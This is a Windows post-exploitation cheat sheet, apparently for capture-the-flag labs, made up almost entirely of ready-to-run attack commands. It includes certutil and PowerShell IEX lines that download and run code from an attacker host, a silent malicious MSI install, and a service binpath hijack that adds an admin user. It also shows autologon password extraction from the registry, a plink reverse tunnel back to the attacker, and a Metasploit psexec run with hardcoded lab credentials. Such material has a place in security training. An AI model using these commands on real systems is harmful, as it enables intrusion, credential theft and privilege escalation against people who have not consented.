# Cheatsheet

## Moving files

> - Ref: http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html

```
certutil -verifyctl -split -f ​ http://10.10.14.8/taskkill.exe
mv *.bin taskkill.exe
```

## Extract ZIP
```
Add-Type -assembly
'system.io.compression.filesystem';[io.compression.zipfile]::ExtractToDirectory
("C:\backup.zip","C:\Example\")
```

## View File Systems
```
gdr -PSProvider 'FileSystem'
```

## Access shared volume
```
net use y: \\10.10.10.57\c$ /user:administrator 1234test
```

## Invoke command with credentials
```
$user = '.\administrator';
$psw = '1234test';
$secpsw = ConvertTo-SecureString $psw -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $user, $secpsw
```
```
invoke-command -computername localhost -credential $credential
-scriptblock {cd C:\Users\Administrator\Desktop\;C:\Users\Administrator\Desktop\root.exe}
```
## Alternate Data Stream
- Listing: `dir /R`
- Find Streams: `​get-item -path *.* -stream *`
- Reading: `​powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
- Reading: `get-content backup.zip -stream 'pass'`

## MSI

### Installing MSI
```
msiexec /quiet /qn /i malicious.msi
```
```
/quiet = Suppress any messages to the user during installation
/qn = No GUI
/i = Regular (vs. administrative) installation
```

## Services

- Registry entries: `HKLM\SYSTEM\CurrentControlSet\Services`
- View service properties: `sc qc "Vulnerable Service"`
- Restarting: `sc stop "Vulnerable Service"`
- Service information: `Get-Service​ ​ "Ubiquiti UniFi Video"​ | fl *`
- Restart PC: `shutdown /r /t 0`
- Change binary path: `sc config "Vulnerable Service" binpath= "net user eviladmin P4ssw0rd@ /add`

### Keep alive
When a service starts in Windows operating systems, it must communicate with the `Service Control Manager`. If it’s not, `Service Control Manager` will terminates the process.

## Auto Save Password to PowerShell
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```
```
​$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)​

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds
```
## Permissions

```
whoami /priv
```

## View Permisions
```
cacls C:\Users\Administrator\Desktop\root.txt
```

### Grant Permissions
```
cacls C:\Users\Administrator\Desktop\root.txt /grant Alfred:F
```

## SSH from Windows to Attacker (Kali)

### Manual
From Windows:
```
plink.exe -l root -pw  -R 445:127.0.0.1:445 10.10.14.8
```

From Attacker:
```
netstat -ano | grep 445
winexe -U Administrator //127.0.0.1 "cmd.exe"
```

### Metasploit
```
portfwd add -l 445 -p 445 -r 127.0.0.1
use exploit/windows/smb/psexec
 set SMBDOMAIN CHATTERBOX
 set SMBUSER Administrators
 set SMBPASS Welcome1!
 set RHOST 127.0.0.1
exploit
```
